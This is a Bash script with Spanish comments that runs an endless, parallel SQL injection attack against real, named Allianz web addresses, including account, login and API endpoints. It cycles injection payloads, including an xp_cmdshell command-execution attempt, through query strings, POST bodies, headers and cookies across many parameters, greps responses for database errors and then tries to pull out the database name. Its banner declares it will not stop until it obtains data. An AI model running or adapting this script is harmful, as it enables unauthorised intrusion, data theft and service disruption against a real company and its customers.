#!/bin/bash

echo "[!] ATAQUE DEFINITIVO - NO SE DETENDRÁ HASTA OBTENER DATOS"
echo "================================================================"

# Función para ataque continuo
attack_loop() {
    local url=$1
    local param=$2
    local count=0
    
    while true; do
        count=$((count + 1))
        
        # Generar payload aleatorio
        PAYLOAD=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
        
        # Payloads SQL
        SQL_PAYLOADS=(
            "' OR '1'='1"
            "' OR 1=1--"
            "' UNION SELECT NULL,database(),NULL--"
            "' UNION SELECT NULL,user(),NULL--"
            "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--"
            "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--"
            "'; EXEC xp_cmdshell('whoami')--"
            "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
            "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        )
        
        # Seleccionar payload aleatorio
        RANDOM_INDEX=$((RANDOM % ${#SQL_PAYLOADS[@]}))
        PAYLOAD="${SQL_PAYLOADS[$RANDOM_INDEX]}"
        
        # Codificar payload
        ENCODED_PAYLOAD=$(echo -n "$PAYLOAD" | xxd -p | tr -d '\n')
        DOUBLE_ENCODED=$(echo -n "$PAYLOAD" | base64 | base64)
        
        # Intentar diferentes métodos
        echo -ne "\r[Intento $count] Testing: $url?$param=..."
        
        # Método 1: Direct
        curl -s -X GET "$url?$param=$PAYLOAD" -H "User-Agent: Mozilla/5.0" > /tmp/response1.txt 2>&1
        
        # Método 2: POST
        curl -s -X POST "$url" -d "$param=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded" > /tmp/response2.txt 2>&1
        
        # Método 3: Header injection
        curl -s -X GET "$url" -H "$param: $PAYLOAD" > /tmp/response3.txt 2>&1
        
        # Método 4: Cookie injection
        curl -s -X GET "$url" -H "Cookie: $param=$PAYLOAD" > /tmp/response4.txt 2>&1
        
        # Verificar respuestas
        for response in /tmp/response*.txt; do
            if grep -qiE "sql|mysql|error|syntax|database|table|column|select|from|where" $response; then
                echo -e "\n[+] VULNERABILIDAD ENCONTRADA!"
                echo "[+] Payload: $PAYLOAD"
                echo "[+] Respuesta guardada en: $response"
                cat $response | head -100
                
                # Intentar extraer más datos
                echo "[*] Intentando extraer datos..."
                curl -s "$url?$param=' UNION SELECT NULL,database(),NULL--" | grep -oE '[a-zA-Z0-9_]+' | sort -u > /tmp/extracted_data.txt
                echo "[+] Datos extraídos:"
                cat /tmp/extracted_data.txt
            fi
        done
        
        # Pausa mínima
        sleep 0.1
    done
}

# URLs objetivo
TARGETS=(
    "https://www.allianzdirect.es/account/"
    "https://www.allianzdirect.es/login/"
    "https://www.allianzdirect.es/api/"
    "https://www.allianzdirect.es/search/"
    "https://pro-edp.apis.allianz.com/prod/"
)

PARAMS=(
    "v" "id" "user" "username" "email" "password" "search" "q" "query"
    "filter" "sort" "page" "debug" "test" "cmd" "file" "path"
)

# Lanzar ataques en paralelo
echo "[*] Lanzando ataques en paralelo..."

for target in "${TARGETS[@]}"; do
    for param in "${PARAMS[@]}"; do
        attack_loop "$target" "$param" &
    done
done

# Esperar
wait